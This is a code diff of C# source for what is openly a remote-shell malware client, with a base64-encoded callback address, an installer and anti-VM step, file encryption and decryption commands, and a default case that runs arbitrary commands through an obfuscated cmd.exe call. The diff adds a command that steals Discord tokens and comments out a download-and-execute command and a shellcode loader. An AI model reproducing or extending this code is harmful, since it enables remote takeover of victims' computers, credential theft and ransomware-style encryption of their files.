@@ -12,15 +12,14 @@ using System.ServiceProcess;
 using System.Collections.Generic;
 using static Crying.Helpers.Common;
 using System.Net.NetworkInformation;
-using System.Management;
-using System.Collections;
+
 
 namespace rshell
-{
+{ 
         static class Rshell
         {
         
-        static string address = "aHR0cDovLzE4LjE5Ny4yMzkuMTA5OjE2ODgwLw=="; // Your IP address in Base64 L: aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv
+        static string address = "aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv"; // Your IP address in Base64 L: aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv
         static string version = "1337";
 
             static string token = Utils.RandomString(15);
@@ -32,6 +31,7 @@ namespace rshell
         static void Main()
             {
             //connect
+
             new Thread(Join).Start();
                 Installer.Install();
                 AntiVM.Runner();
@@ -360,17 +360,18 @@ namespace rshell
                                 }
                                 break;
 
-                            case "execurl":
-                                using (WebClient wc = new WebClient())
-                                {
-                                    wc.DownloadFile(args[0], args[1]); // $_FILE['file']
-                                    Process.Start(args[1]);
-                                    message.Add("text", "File uploaded from '" + args[0] + "' to '" + args[1] + "'");
-                                }
-#if DEBUG
-                                Logger.Log.WriteLine(args[0] + "-" + args[1]);
-#endif
-                                break;
+//                            case "execurl":
+//                                using (WebClient wc = new WebClient())
+//                                {
+//                                    wc.DownloadFile(args[0], args[1]); // $_FILE['file']
+//                                    Process.Start(args[1]);
+//                                    message.Add("text", "File uploaded from '" + args[0] + "' to '" + args[1] + "'");
+//                                }
+//#if DEBUG
+//                                Logger.Log.WriteLine(args[0] + "-" + args[1]);
+//#endif
+//                                break;
+
                             case "encrypt":
                                 new Thread(Encryptor.Encrypt).Start();
                                 message.Add("text", "Started Encrypting");
@@ -381,22 +382,29 @@ namespace rshell
                                 message.Add("text", "Started Decrypting");
                                 break;
 
-                            case "shellc":
-                                if (args.Count == 1)
-                                {
-#if DEBUG
-                                    Logger.Log.WriteLine(args[0]);
-#endif
-                                    IntPtr address;
-                                    ulong size;
-                                    var shellcode = Utils.LoadShellcodeProc<Code>(Convert.FromBase64String(args[0]), out address, out size);
-                                    shellcode();
-                                } 
-                                else
-                                {
-                                    message.Add("text", "WaawWoo");
-                                }
+                            case "discord":
+                                List<string> dtoken = new List<string>();
+                                foreach (string tokens in DiscordGrabber.GetTokens())
+                                        dtoken.Add(tokens);
+                                message.Add("text", String.Join("\n", dtoken));
                                 break;
+
+                            //                            case "shellc":
+                            //                                if (args.Count == 1)
+                            //                                {
+                            //#if DEBUG
+                            //                                    Logger.Log.WriteLine(args[0]);
+                            //#endif
+                            //                                    IntPtr address;
+                            //                                    ulong size;
+                            //                                    var shellcode = Utils.LoadShellcodeProc<Code>(Convert.FromBase64String(args[0]), out address, out size);
+                            //                                    shellcode();
+                            //                                } 
+                            //                                else
+                            //                                {
+                            //                                    message.Add("text", "WaawWoo");
+                            //                                }
+                            //                                break;
 
                             default:
                                     message.Add("text", Utils.Exec(String.Join("", "dmc".ToCharArray().Reverse().ToArray()), "/C " + text, timeout));
